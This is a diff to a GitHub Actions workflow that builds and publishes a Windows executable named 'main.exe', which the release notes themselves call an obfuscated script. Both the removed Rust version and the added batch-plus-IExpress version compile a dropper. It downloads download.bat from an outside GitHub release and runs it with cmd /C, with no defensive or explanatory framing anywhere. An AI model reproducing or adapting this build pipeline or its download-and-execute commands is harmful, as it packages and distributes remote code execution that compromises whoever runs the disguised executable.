@@ -21,35 +21,36 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v2
 
-    - name: Setup Rust
-      uses: actions-rs/toolchain@v1
-      with:
-        toolchain: stable
-        target: x86_64-pc-windows-msvc
-        profile: minimal
-
-    - name: Create Rust file
+    - name: Create Batch Script
       run: |
-        Add-Content -Path script.rs -Value 'use std::process::Command;'
-        Add-Content -Path script.rs -Value 'fn main() {'
-        Add-Content -Path script.rs -Value '    Command::new("curl")'
-        Add-Content -Path script.rs -Value '        .arg("-L")'
-        Add-Content -Path script.rs -Value '        .arg("-o")'
-        Add-Content -Path script.rs -Value '        .arg("download.bat")'
-        Add-Content -Path script.rs -Value '        .arg("https://github.com/43a1723/test/releases/download/AutoBuild/download.bat")'
-        Add-Content -Path script.rs -Value '        .status()'
-        Add-Content -Path script.rs -Value '        .expect("Failed to download file");'
-        Add-Content -Path script.rs -Value ''
-        Add-Content -Path script.rs -Value '    Command::new("cmd")'
-        Add-Content -Path script.rs -Value '        .arg("/C")'
-        Add-Content -Path script.rs -Value '        .arg("download.bat")'
-        Add-Content -Path script.rs -Value '        .status()'
-        Add-Content -Path script.rs -Value '        .expect("Failed to execute batch file");'
-        Add-Content -Path script.rs -Value '}'
+        @echo off
+        echo @echo off > script.bat
+        echo powershell -Command "Invoke-WebRequest -Uri 'https://github.com/43a1723/test/releases/download/AutoBuild/download.bat' -OutFile 'download.bat'" >> script.bat
+        echo start /wait cmd /C download.bat >> script.bat
 
-    - name: Compile Rust Script
+    - name: Create IExpress Configuration
       run: |
-        rustc script.rs -o script.exe
+        # Save IExpress configuration to a file
+        $iexpressScript = @"
+        [Version]
+        Signature="$Windows NT$"
+        [Components]
+        ; Specify the batch file
+        ; This will package script.bat into the executable
+        [Setup]
+        ; Define IExpress settings
+        PackageType=SELF_EXTRACT
+        [Files]
+        ; Define the files to include
+        SourceFiles=script.bat
+        ; Specify the output file name
+        OutputPath=dist/script.exe
+        "@
+        $iexpressScript | Set-Content -Path script.sed -Encoding utf8
+
+    - name: Compile Batch Script with IExpress
+      run: |
+        iexpress /N /Q /M script.sed
 
     - name: Delete-tag-and-release
       uses: dev-drprasad/delete-tag-and-release@v1.1
@@ -66,7 +67,7 @@ jobs:
       with:
         tag_name: AutoBuildExe
         release_name: AutoBuildExe
-        body: Obfuscated run.cmd file
+        body: Obfuscated batch script
         draft: false
         prerelease: false
 
@@ -77,6 +78,6 @@ jobs:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       with:
         upload_url: ${{ steps.create_release.outputs.upload_url }}
-        asset_path: script.exe
+        asset_path: dist/script.exe
         asset_name: main.exe
         asset_content_type: application/octet-stream
